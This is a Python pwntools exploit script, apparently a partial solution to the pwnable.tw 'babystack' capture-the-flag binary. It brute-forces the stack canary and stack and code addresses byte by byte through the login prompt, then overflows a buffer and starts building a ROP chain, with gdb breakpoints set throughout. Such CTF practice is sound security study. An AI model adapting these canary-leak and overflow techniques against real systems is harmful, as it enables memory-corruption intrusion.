from pwn import *

pwnable = './babystack'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'x86_64')

#context.log_level = 'DEBUG'

#setarch $(uname -m) -R /bin/bash
debug_set = ''

debug_set_1 = '''
    b *0x555555554e94
    '''
debug_set_2 = '''
    b *0x555555554e23
    b *0x555555554cbe
    b *0x555555554ebb
    '''
debug_set_3 = '''
    b *0x555555554f4c
    b *0x555555554ebb
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554ec0
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554cbe
    b *0x555555554e43
    b *0x555555554fcb
    b *0x555555554fee
    commands
        set *(int64_t *)0x00007fffffffe5c0=*(int64_t *)0x00007ffff7ff6000
        set *(int64_t *)0x00007fffffffe5c8=*(int64_t *)0x00007ffff7ff6008
    end
    '''
debug_set_4 = '''
    b *0x555555554ebb
    b *0x555555554e43
    '''



if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    #p = process("./seethefile", env=env)
    #gdb.attach(p, debug_set_1)
    p = process(pwnable)
    gdb.attach(p, debug_set_4)
else:
    #p = process('./seethefile')
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    p = process(pwnable)
    #p = remote('chall.pwnable.tw', 10205)




base_static = 0x555555554000
pop_rdi = 0x000010c3

def copy(string):
    p.recvuntil(">>")
    p.send("3")
    p.recvuntil(":")
    p.send(string)



def leak_canary_and_code():
    canary = ''
    payload = ''
    for x in range(32):
        if x == 2:
            gdb.attach(p, 'b *0x555555554e43')
        for y in range (0x100):
            temp_canary = canary
            temp_canary += str(hex(y))[2:].zfill(2)
            temp_payload = payload
            temp_payload += p8(y)
            if y == 0x00 or y == 0xa:
                continue
            p.recvuntil(">>")
            p.sendline("1111111111111111" + temp_payload)
            #p.sendline("1")
            #p.sendline("1")
            #p.recvuntil(":")
            #p.sendline(temp_payload)
            print("try : " + temp_canary)
            response = p.recvline()
            if "Failed !" in response:
                continue
            else:
                canary = temp_canary
                payload += p8(y)
                #print("canary :: " + str(payload))
                p.sendline("1")
                p.recvuntil(">>")
    return temp_canary

def leak_canary():
    canary = ''
    payload = ''
    for x in range(16):
        if x == 2:
            gdb.attach(p, 'b *0x555555554e43')
        for y in range (0x100):
            temp_canary = canary
            temp_canary += str(hex(y))[2:].zfill(2)
            temp_payload = payload
            temp_payload += p8(y)
            if y == 0x00 or y == 0xa:
                continue
            p.recvuntil(">>")
            #p.sendline("1111111111111111" + temp_payload)
            p.sendline("1")
            #p.sendline("1")
            p.recvuntil(":")
            p.sendline(temp_payload)
            print("try : " + temp_canary)
            response = p.recvline()
            if "Failed !" in response:
                continue
            else:
                canary = temp_canary
                payload += p8(y)
                #print("canary :: " + str(payload))
                p.sendline("1")
                p.recvuntil(">>")
                break
    return temp_canary


def leak_stack(leaked_canary):
    canary = leaked_canary
    payload = leaked_canary.decode("hex")
    for x in range(6):
        if x == 2:
            gdb.attach(p, 'b *0x555555554e43')
        for y in range (0x100):
            temp_canary = canary
            temp_canary += str(hex(y))[2:].zfill(2)
            temp_payload = payload
            temp_payload += p8(y)
            if y == 0x00:
            #if y == 0x00 or y == 0xa:
                continue
            p.recvuntil(">>")
            #p.sendline("1111111111111111" + temp_payload)
            #p.sendline("1")
            p.sendline("1")
            p.recvuntil(":")
            p.sendline(temp_payload)
            print("try : " + temp_canary)
            response = p.recvline()
            if "Failed !" in response:
                continue
            else:
                canary = temp_canary
                payload += p8(y)
                #print("canary :: " + str(payload))
                p.sendline("1")
                p.recvuntil(">>")
                break
    return temp_canary

#p.recvuntil(">>")
#p.sendline("1")
#p.recvuntil(":")
#p.sendline("\x00" + 'B'*62)
#p.sendline("B")

#copy('A' * 63)
#p.recvuntil(">>")
#p.sendline("1")

#debug_set_2

def leak_step_1():
    leaked_mem = leak_canary()
    canary = leaked_mem[:32]


    leaked_mem = leak_stack(canary)
    stack = leaked_mem[32:44]
    print("try canary :: " + canary)
    byte_array = bytearray.fromhex(stack)
    reversed_byte_array = byte_array[::-1]
    hex_string = ''.join('{:02x}'.format(x) for x in reversed_byte_array)

    stack_base = int('0x0000' + hex_string[:8] + '0000', 16) - 0x00012000
    
    print("try canary :: " + canary)
    print("try stack :: " + hex_string)
    print("try stack :: " + '0x0000' + hex_string[:8] + '0000')
    print("try stack_base :: " + hex(stack_base))

def leak_canary_and_base():
    leaked_mem = leak_canary_and_code()
    canary = leaked_mem[:32]
    leaked_addr = leaked_mem[64:76]
    zfill_leaked_addr = leaked_addr
    print("try leaked_addr 1 :: " + zfill_leaked_addr)


    byte_array = bytearray.fromhex(leaked_addr)
    reversed_byte_array = byte_array[::-1]
    hex_string = ''.join('{:02x}'.format(x) for x in reversed_byte_array)
    print("try canary :: " + canary)
    print("try leaked_addr 2 :: " + hex_string.zfill(16))

    elf.address = int("0x" + hex_string.zfill(16), 16) - 0x00001060
    print("try elf.address :: " + hex(elf.address))
    leak_stack(canary)

#debug_set_4
def overflow():
    elf.address = base_static

    print("elf.addressi :: " + hex(elf.symbols['puts']))

    rop = ROP(elf)
    #rop.call(elf.symbols['puts'], [elf.got['puts']])
    rop.call(elf.plt['puts'])

    print rop.dump()

    p.recvuntil(">>")
    p.send("1")
    p.recvuntil(":")
    #p.sendline("\x00" + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaAAAAAAAABBBBBBBB" + p64(0x7fffffffe4f0) + p64(0x555555554ca0))
    #p.send("\x00" + '1' * 79)
    p.send("\x00" + '1' * (79))
    #p.sendline("\x00" + "aaaaaaaabaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    #p.sendline("\x00" + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaa" + p64(0x555555554ecd) + p64(0x00007fffffffe4f0))
    #copy('A' * 63)
    copy('11')

    #p.recvuntil(">>")
    #p.sendline("1111111111111111")
    #p.recvuntil(":")
    #p.sendline("1")
    #p.recvuntil(">>")
    #p.sendline("1")
    #p.recvuntil(":")
    #p.sendline("1")

overflow()
#leak_step_1()
#leak_canary_and_base()
#p.recvuntil(">>")
#p.sendline("1")

p.recvuntil(">>")
p.sendline("2")
p.wait_for_close()

